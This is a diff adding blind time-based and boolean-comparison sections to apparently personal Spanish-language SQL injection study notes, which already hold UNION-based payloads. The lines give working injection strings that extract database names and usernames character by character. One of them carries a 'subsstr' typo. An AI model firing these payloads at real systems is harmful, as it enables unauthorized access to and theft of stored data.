@@ -101,6 +101,20 @@ cn' UNION select 1,COLUMN_NAME,2,3 from INFORMATION_SCHEMA.COLUMNS where table_n
 cn' UNION select 1, <columna1>, <columna2>, 4 from <database>.<table>-- -
 #El rresultado de las columnas fue de 2: username y passwords
 
+## Enumeracion blind time based
+En algunos casos, la injection no va a devolvernos un output, por este motivo obtener el nombre de la db puede ser un tanto complicado. Para ello usamos condicionales if.
+
+'or if(substr(database(),1,1)='letra',sleep(5),1)-- -
+#Se busca un sleep de 5 segundos si la base de datos comienza con la letra especificada
+
+## Enumeracion por comparacion
+Al igual que el caso blind time, en ese se comparan los strings. a=a es true, b=a es false. Esto funciona si en la response tenemos X para algo correcto e Y para algo incorrecto
+
+'or (select substr(database(),1,1))='letra'-- -
+#Puede ser substr o substring dependiendo la db. De todas formas, la idea es la misma. Busca en el primer caracter que la letra coincida
+'or (select subsstr(username,1,1) from users limit 1)='letra'-- -
+#Se selecciona de la tabla users el primer username y la primer letra para comparar
+
 	####Leer archivos
 Primero debemos saber que usuario tenemos y, dependiendo esto, saber los alcances que puede tener tanto en lectura como escritura de archivos mediante el permiso FILE.
 
